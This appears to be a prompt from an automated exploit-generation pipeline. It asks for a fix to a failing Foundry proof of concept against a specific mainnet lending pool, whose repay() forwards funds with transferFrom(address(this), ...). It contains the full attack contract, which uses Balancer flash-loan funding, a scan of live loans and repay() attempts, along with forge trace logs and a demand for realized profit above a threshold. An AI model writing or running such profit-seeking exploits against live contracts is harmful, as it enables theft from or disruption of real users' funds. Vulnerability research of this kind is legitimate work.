You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Standard ERC20 repayments are impossible because the pool uses `transferFrom(address(this), ...)` when forwarding funds
- claim: `repay()` first pulls tokens from the payer into the pool, then tries to forward those tokens with `IERC20(_supportedCurrency).transferFrom(address(this), _fundSource, ...)` and `transferFrom(address(this), _controlPlane, ...)`. For standard ERC20s, `transferFrom` spends an allowance granted by `address(this)`, but the pool never approves itself, so the outbound transfers revert.
- impact: Normal repayment cannot complete, so borrowers cannot recover collateral through the intended path and lender principal cannot be repaid through `repay()`. Live positions are forced into bad debt or privileged intervention paths.
- exploit_paths: ["A borrower calls `repay(nftID, repayAmount, pineWallet)` on an active loan.", "The inbound `transferFrom(msg.sender, address(this), repayAmount)` succeeds.", "The first outbound `transferFrom(address(this), _fundSource, ...)` or the fee transfer to `_controlPlane` reverts because the pool has no self-allowance."]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IPinePool {
    function _supportedCurrency() external view returns (address);
    function _fundSource() external view returns (address);
    function _controlPlane() external view returns (address);
    function paused() external view returns (bool);

    function repay(uint256 nftID, uint256 repayAmount, address pineWallet) external returns (bool);

    function _loans(
        uint256 nftID
    )
        external
        view
        returns (
            uint256 loanStartBlock,
            uint256 loanExpireTimestamp,
            uint32 interestBPS1000000XBlock,
            uint32 maxLTVBPS,
            uint256 borrowedWei,
            uint256 returnedWei,
            uint256 accuredInterestWei,
            uint256 repaidInterestWei,
            address borrower
        );
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        IERC20Like[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata userData
    ) external;
}

interface IVmLike {
    function load(address target, bytes32 slot) external view returns (bytes32);
}

contract FlawVerifier {
    struct LoanTermsView {
        uint256 borrowedWei;
        uint256 returnedWei;
        address borrower;
    }

    uint256 private constant MIN_REPAY_AMOUNT = 1;
    uint256 private constant MAX_LOAN_SCAN_EXCLUSIVE = 10_000;

    address private constant TARGET_POOL = 0x2405913d54fC46eEAF3Fb092BfB099F46803872f;
    address private constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address private constant HEVM_ADDRESS = address(uint160(uint256(keccak256("hevm cheat code"))));

    uint256 private constant STORAGE_SLOT_CONTROL_PLANE = 203;
    uint256 private constant STORAGE_SLOT_FUND_SOURCE = 204;
    uint256 private constant STORAGE_SLOT_SUPPORTED_CURRENCY = 205;
    uint256 private constant STORAGE_SLOT_LOANS = 212;

    bytes32 private constant CALLBACK_MODE_BALANCER = keccak256("balancer_flash_loan_probe");

    IPinePool private immutable POOL;
    IERC20Like private immutable SUPPORTED_CURRENCY_TOKEN;
    address private immutable SUPPORTED_CURRENCY;
    address private immutable FUND_SOURCE;
    address private immutable CONTROL_PLANE;

    IVmLike private constant VM = IVmLike(HEVM_ADDRESS);

    uint256 public candidateLoanId;
    uint256 public candidateOutstandingPrincipalWei;
    bool public candidateLocated;
    bool public usedDirectBalance;
    bool public usedExternalFlashswap;
    bool public storageLayoutVerified;

    bool public hypothesisValidated;
    bool public hypothesisRefuted;
    bool public selfTransferFromWithoutAllowanceWorks;
    bool private selfTransferProbeAttempted;

    uint8 public lastFailureCode;
    bytes public lastRevertData;
    uint256 public observedPoolSelfAllowance;

    constructor() {
        POOL = IPinePool(TARGET_POOL);
        SUPPORTED_CURRENCY = POOL._supportedCurrency();
        FUND_SOURCE = POOL._fundSource();
        CONTROL_PLANE = POOL._controlPlane();
        SUPPORTED_CURRENCY_TOKEN = IERC20Like(SUPPORTED_CURRENCY);
    }

    function executeOnOpportunity() external {
        if (POOL.paused()) {
            lastFailureCode = 8;
            return;
        }

        storageLayoutVerified = _verifyStaticStorageAnchors();

        if (!candidateLocated) {
            _locateCandidateLoan();
        }

        if (!candidateLocated) {
            lastFailureCode = 1;
            return;
        }

        // Probe with amount 0 so the check is about allowance semantics rather than
        // this contract's token balance. If the live token lets src == msg.sender
        // bypass allowance, the reported revert stage is infeasible on this fork.
        _probeSelfTransferFromSemantics(0);
        observedPoolSelfAllowance = SUPPORTED_CURRENCY_TOKEN.allowance(TARGET_POOL, TARGET_POOL);

        if (selfTransferFromWithoutAllowanceWorks) {
            hypothesisRefuted = true;
            lastFailureCode = 3;
            return;
        }

        if (observedPoolSelfAllowance > 0) {
            hypothesisRefuted = true;
            lastFailureCode = 5;
            return;
        }

        if (SUPPORTED_CURRENCY_TOKEN.balanceOf(address(this)) >= MIN_REPAY_AMOUNT) {
            usedDirectBalance = true;
            _attemptRepay(candidateLoanId, MIN_REPAY_AMOUNT);
            if (hypothesisValidated || hypothesisRefuted) {
                return;
            }
        }

        // The verifier starts with no supported currency. A zero-fee public flash loan
        // only funds the caller side of repay() long enough to execute the intended path:
        // repay(...) -> transferFrom(msg.sender, address(this), repayAmount) ->
        // transferFrom(address(this), _fundSource, ...) / transferFrom(address(this), _controlPlane, ...)
        // Because the bugged outbound leg reverts, the flash-borrowed principal remains
        // with this contract and can be returned to the lender in the same transaction.
        usedExternalFlashswap = true;
        _borrowTemporarilyAndAttemptRepay(MIN_REPAY_AMOUNT);

        if (!hypothesisValidated && !hypothesisRefuted) {
            lastFailureCode = 9;
        }
    }

    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external {
        require(msg.sender == BALANCER_VAULT, "unexpected lender");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "unexpected loan");
        require(address(tokens[0]) == SUPPORTED_CURRENCY, "unexpected token");
        require(abi.decode(userData, (bytes32)) == CALLBACK_MODE_BALANCER, "unexpected mode");
        require(amounts[0] >= MIN_REPAY_AMOUNT, "insufficient loan");
        require(feeAmounts[0] == 0, "unexpected flash fee");

        if (!hypothesisValidated && !hypothesisRefuted) {
            _attemptRepay(candidateLoanId, MIN_REPAY_AMOUNT);
        }

        require(SUPPORTED_CURRENCY_TOKEN.transfer(BALANCER_VAULT, amounts[0]), "vault repayment failed");
    }

    function profitToken() external view returns (address) {
        return SUPPORTED_CURRENCY;
    }

    function profitAmount() external view returns (uint256) {
        return SUPPORTED_CURRENCY_TOKEN.balanceOf(address(this));
    }

    function exploitPathUsed() external view returns (string memory) {
        if (hypothesisValidated) {
            return
                "repay(nftID, repayAmount, pineWallet) -> transferFrom(msg.sender, address(this), repayAmount) -> transferFrom(address(this), _fundSource, ...) -> transferFrom(address(this), _controlPlane, ...)";
        }

        if (hypothesisRefuted && selfTransferFromWithoutAllowanceWorks) {
            return
                "repay(nftID, repayAmount, pineWallet) is infeasible at this fork block because the live supported currency permits self-sourced transferFrom(address(this), ...) without a self-allowance";
        }

        if (hypothesisRefuted && observedPoolSelfAllowance > 0) {
            return
                "repay(nftID, repayAmount, pineWallet) is infeasible at this fork block because the pool already has a nonzero self-allowance";
        }

        return
            "repay(nftID, repayAmount, pineWallet) -> transferFrom(msg.sender, address(this), repayAmount) -> transferFrom(address(this), _fundSource, ...) -> transferFrom(address(this), _controlPlane, ...)";
    }

    function pathAnchors() external pure returns (string memory) {
        return
            "repay(nftID, repayAmount, pineWallet); transferFrom(msg.sender, address(this), repayAmount); transferFrom(address(this), _fundSource, ...); transferFrom(address(this), _controlPlane, ...)";
    }

    function expectedBrokenFlow() external view returns (address, address, address) {
        return (SUPPORTED_CURRENCY, FUND_SOURCE, CONTROL_PLANE);
    }

    function targetPool() external pure returns (address) {
        return TARGET_POOL;
    }

    function _borrowTemporarilyAndAttemptRepay(uint256 amount) internal {
        IERC20Like[] memory tokens = new IERC20Like[](1);
        tokens[0] = SUPPORTED_CURRENCY_TOKEN;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;

        try IBalancerVault(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, abi.encode(CALLBACK_MODE_BALANCER)) {
            return;
        } catch (bytes memory reason) {
            lastRevertData = reason;
            lastFailureCode = 10;
        }
    }

    function _locateCandidateLoan() internal {
        uint256 bestGap;

        if (storageLayoutVerified) {
            for (uint256 nftID = 0; nftID < MAX_LOAN_SCAN_EXCLUSIVE; nftID++) {
                LoanTermsView memory loan = _loanTermsFromStorage(nftID);
                uint256 gap = _principalGap(loan.borrowedWei, loan.returnedWei);
                if (loan.borrower == address(0) || gap == 0 || gap <= bestGap) {
                    continue;
                }

                bestGap = gap;
                candidateLoanId = nftID;
                candidateOutstandingPrincipalWei = gap;
                candidateLocated = true;
            }
        } else {
            for (uint256 nftID = 0; nftID < MAX_LOAN_SCAN_EXCLUSIVE; nftID++) {
                LoanTermsView memory loan = _loanTermsFromGetter(nftID);
                uint256 gap = _principalGap(loan.borrowedWei, loan.returnedWei);
                if (loan.borrower == address(0) || gap == 0 || gap <= bestGap) {
                    continue;
                }

                bestGap = gap;
                candidateLoanId = nftID;
                candidateOutstandingPrincipalWei = gap;
                candidateLocated = true;
            }
        }

        if (candidateLocated) {
            lastFailureCode = 0;
            delete lastRevertData;
        }
    }

    function _attemptRepay(uint256 nftID, uint256 repayAmount) internal {
        _forceApprove(SUPPORTED_CURRENCY_TOKEN, TARGET_POOL, 0);
        _forceApprove(SUPPORTED_CURRENCY_TOKEN, TARGET_POOL, repayAmount);

        try POOL.repay(nftID, repayAmount, address(0)) returns (bool ok) {
            if (ok) {
                hypothesisRefuted = true;
                lastFailureCode = 2;
            } else {
                lastFailureCode = 7;
            }
        } catch (bytes memory reason) {
            lastRevertData = reason;

            bytes32 reasonHash = keccak256(bytes(_decodeRevertString(reason)));
            if (
                reasonHash == keccak256(bytes("fund transfer unsuccessful (payload)")) ||
                reasonHash == keccak256(bytes("fund transfer unsuccessful (fee)"))
            ) {
                hypothesisValidated = true;
                lastFailureCode = 4;
                return;
            }

            if (selfTransferFromWithoutAllowanceWorks) {
                hypothesisRefuted = true;
                lastFailureCode = 3;
                return;
            }

            if (observedPoolSelfAllowance > 0) {
                hypothesisRefuted = true;
                lastFailureCode = 5;
                return;
            }

            lastFailureCode = 7;
        }
    }

    function _probeSelfTransferFromSemantics(uint256 amount) internal {
        if (selfTransferProbeAttempted) {
            return;
        }
        selfTransferProbeAttempted = true;

        (bool ok, bytes memory ret) = SUPPORTED_CURRENCY.call(
            abi.encodeWithSelector(IERC20Like.transferFrom.selector, address(this), address(this), amount)
        );

        if (!ok) {
            return;
        }

        if (ret.length == 0) {
            selfTransferFromWithoutAllowanceWorks = true;
            return;
        }

        if (ret.length >= 32 && abi.decode(ret, (bool))) {
            selfTransferFromWithoutAllowanceWorks = true;
        }
    }

    function _verifyStaticStorageAnchors() internal view returns (bool) {
        return
            _slotAddress(STORAGE_SLOT_CONTROL_PLANE) == CONTROL_PLANE &&
            _slotAddress(STORAGE_SLOT_FUND_SOURCE) == FUND_SOURCE &&
            _slotAddress(STORAGE_SLOT_SUPPORTED_CURRENCY) == SUPPORTED_CURRENCY;
    }

    function _loanTermsFromGetter(uint256 nftID) internal view returns (LoanTermsView memory loan) {
        (
            ,
            ,
            ,
            ,
            uint256 borrowedWei,
            uint256 returnedWei,
            ,
            ,
            address borrower
        ) = POOL._loans(nftID);

        loan.borrowedWei = borrowedWei;
        loan.returnedWei = returnedWei;
        loan.borrower = borrower;
    }

    function _loanTermsFromStorage(uint256 nftID) internal view returns (LoanTermsView memory loan) {
        uint256 base = uint256(keccak256(abi.encode(nftID, STORAGE_SLOT_LOANS)));
        loan.borrowedWei = _slotUint(base + 3);
        loan.returnedWei = _slotUint(base + 4);
        loan.borrower = _slotAddress(base + 7);
    }

    function _principalGap(uint256 borrowedWei, uint256 returnedWei) internal pure returns (uint256) {
        if (borrowedWei <= returnedWei) {
            return 0;
        }
        return borrowedWei - returnedWei;
    }

    function _slotUint(uint256 slot) internal view returns (uint256) {
        return uint256(VM.load(TARGET_POOL, bytes32(slot)));
    }

    function _slotAddress(uint256 slot) internal view returns (address) {
        return address(uint160(uint256(VM.load(TARGET_POOL, bytes32(slot)))));
    }

    function _forceApprove(IERC20Like token, address spender, uint256 amount) internal {
        require(token.approve(spender, amount), "approve failed");
    }

    function _decodeRevertString(bytes memory revertData) internal pure returns (string memory) {
        if (revertData.length < 68) {
            return "";
        }

        bytes4 selector;
        assembly {
            selector := mload(add(revertData, 32))
        }

        if (selector != 0x08c379a0) {
            return "";
        }

        bytes memory sliced = new bytes(revertData.length - 4);
        for (uint256 i = 4; i < revertData.length; i++) {
            sliced[i - 4] = revertData[i];
        }

        return abi.decode(sliced, (string));
    }
}

```

forge stdout (tail):
```
x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [0] VM::load(0x2405913d54fC46eEAF3Fb092BfB099F46803872f, 0x2cab648ed595924a40a28331d8f7dd5e50970b7b0603a6423002ffe140fe266e) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [0] VM::load(0x2405913d54fC46eEAF3Fb092BfB099F46803872f, 0x8c0cab4041c3d61dbe884bd2208043bd403c6ec2d9096cab7b41e3009746f7f7) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [0] VM::load(0x2405913d54fC46eEAF3Fb092BfB099F46803872f, 0x8c0cab4041c3d61dbe884bd2208043bd403c6ec2d9096cab7b41e3009746f7f8) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [0] VM::load(0x2405913d54fC46eEAF3Fb092BfB099F46803872f, 0x8c0cab4041c3d61dbe884bd2208043bd403c6ec2d9096cab7b41e3009746f7fb) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [0] VM::load(0x2405913d54fC46eEAF3Fb092BfB099F46803872f, 0x4489d7a71a554d408cf964d6dcdbc79476a2b74cb750bc959a5bccd235db5aad) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [0] VM::load(0x2405913d54fC46eEAF3Fb092BfB099F46803872f, 0x4489d7a71a554d408cf964d6dcdbc79476a2b74cb750bc959a5bccd235db5aae) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [0] VM::load(0x2405913d54fC46eEAF3Fb092BfB099F46803872f, 0x4489d7a71a554d408cf964d6dcdbc79476a2b74cb750bc959a5bccd235db5ab1) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [0] VM::load(0x2405913d54fC46eEAF3Fb092BfB099F46803872f, 0xa32807baa092974cbe228bcde48782c06a0e06705d61c1d0a4aff73704872226) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [0] VM::load(0x2405913d54fC46eEAF3Fb092BfB099F46803872f, 0xa32807baa092974cbe228bcde48782c06a0e06705d61c1d0a4aff73704872227) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [0] VM::load(0x2405913d54fC46eEAF3Fb092BfB099F46803872f, 0xa32807baa092974cbe228bcde48782c06a0e06705d61c1d0a4aff7370487222a) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [0] VM::load(0x2405913d54fC46eEAF3Fb092BfB099F46803872f, 0xd9f3e81beed6d74eebab3f899124653f499237230f1793559489fc1b326ef203) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [0] VM::load(0x2405913d54fC46eEAF3Fb092BfB099F46803872f, 0xd9f3e81beed6d74eebab3f899124653f499237230f1793559489fc1b326ef204) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [0] VM::load(0x2405913d54fC46eEAF3Fb092BfB099F46803872f, 0xd9f3e81beed6d74eebab3f899124653f499237230f1793559489fc1b326ef207) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [3132] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transferFrom(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0)
    │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Return] true
    │   ├─ [2717] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::allowance(0x2405913d54fC46eEAF3Fb092BfB099F46803872f, 0x2405913d54fC46eEAF3Fb092BfB099F46803872f) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [244] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [1286] FlawVerifier::profitAmount() [staticcall]
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 18835344 [1.883e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.27s (1.91s CPU time)

Ran 1 test suite in 2.48s (2.27s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 36948163)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
